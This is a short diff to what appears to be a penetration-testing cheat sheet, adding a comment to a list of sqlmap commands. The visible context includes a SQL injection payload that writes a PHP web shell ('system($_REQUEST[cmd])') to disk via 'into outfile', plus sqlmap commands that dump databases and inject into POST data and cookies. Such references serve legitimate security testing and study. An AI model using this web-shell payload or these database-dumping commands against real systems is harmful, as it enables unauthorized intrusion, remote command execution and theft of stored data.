@@ -653,7 +653,7 @@ cn' union select "",'<?php system($_REQUEST[cmd]); ?>', "", "" into outfile '/va
 ```
 $ sqlmap -u <URL> --batch --dump
 $ sqlmap <URL> --data 'uid=1&name=test'
-$ sqlmap <URL> --data 'uid=1*&name=test'
+$ sqlmap <URL> --data 'uid=1*&name=test'        # use * to specify the parameter to inject e.g. to test HTTP headers like cookie header 
 $ sqlmap <URL> --random-agent
 $ sqlmap <URL> --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
 $ sqlmap -u <URL> --data='id=1' --method PUT
